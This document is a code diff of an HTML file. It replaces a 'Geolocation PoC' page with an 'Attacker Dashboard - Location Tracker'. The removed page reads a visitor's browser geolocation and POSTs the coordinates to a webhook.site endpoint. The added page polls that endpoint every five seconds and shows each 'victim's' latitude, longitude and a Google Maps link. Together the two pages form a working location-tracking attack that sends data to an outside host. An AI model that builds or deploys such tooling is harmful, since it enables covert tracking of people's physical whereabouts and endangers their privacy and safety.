@@ -1,63 +1,87 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Geolocation PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 50px;
-    }
-    button {
-      padding: 15px 25px;
-      background-color: #007bff;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            text-align: center;
+            padding-top: 50px;
+        }
+        h2 {
+            color: #333;
+        }
+        pre {
+            font-size: 14px;
+            background-color: #eaeaea;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 20px auto;
+            max-width: 80%;
+            word-wrap: break-word;
+            text-align: left;
+        }
+        #locationLink {
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <h1>Geolocation PoC</h1>
-  <button onclick="getLocation()">Get My Location</button>
 
-  <p id="output">Location: Not yet retrieved.</p>
+<h2>Attacker Dashboard - Location Tracker</h2>
+<p>Victim location data will be displayed here:</p>
 
-  <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
+<!-- Displaying the received location data -->
+<pre id="locationData">Waiting for victim data...</pre>
 
-          // Display the location
-          document.getElementById('output').textContent = `Latitude: ${lat}, Longitude: ${lon}`;
+<!-- Link to open the location on Google Maps -->
+<div id="locationLink" style="display:none;">
+    <p>Click the link below to see the location on Google Maps:</p>
+    <a id="mapLink" target="_blank">View on Google Maps</a>
+</div>
 
-          // Send location data to external API (Webhook.site)
-          fetch('https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070', {  // Ganti dengan URL Webhook kamu
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-              latitude: lat,
-              longitude: lon
+<script>
+    const locationDataDisplay = document.getElementById('locationData');
+    const locationLink = document.getElementById('locationLink');
+    const mapLink = document.getElementById('mapLink');
+
+    // Fetch the location data from the victim page
+    function fetchLocationData() {
+        // This is the endpoint where victim's location is being sent
+        const endpoint = 'https://webhook.site/11f44e56-235f-4edb-954d-73e1048d7070'; // Replace with your webhook URL
+
+        fetch(endpoint)
+            .then(response => response.json())
+            .then(data => {
+                if (data && data.body) {
+                    const location = JSON.parse(data.body);
+                    const lat = location.latitude;
+                    const lon = location.longitude;
+
+                    // Displaying the location data
+                    locationDataDisplay.textContent = `Location received: Latitude ${lat}, Longitude ${lon}`;
+
+                    // Provide a link to Google Maps showing the location
+                    const googleMapsUrl = `https://maps.google.com/?q=${lat},${lon}`;
+                    mapLink.href = googleMapsUrl;
+                    mapLink.textContent = `View location at ${lat.toFixed(4)}, ${lon.toFixed(4)} on Google Maps`;
+
+                    locationLink.style.display = 'block';
+                }
             })
-          })
-          .then(response => response.json())
-          .then(data => {
-            console.log('Location logged:', data);
-          })
-          .catch(error => {
-            console.error('Error logging location:', error);
-          });
-        });
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
+            .catch(error => {
+                console.error('Error fetching location data:', error);
+                locationDataDisplay.textContent = 'Failed to retrieve location data.';
+            });
     }
-  </script>
+
+    // Polling the webhook every 5 seconds to check for new data
+    setInterval(fetchLocationData, 5000);
+
+</script>
+
 </body>
 </html>
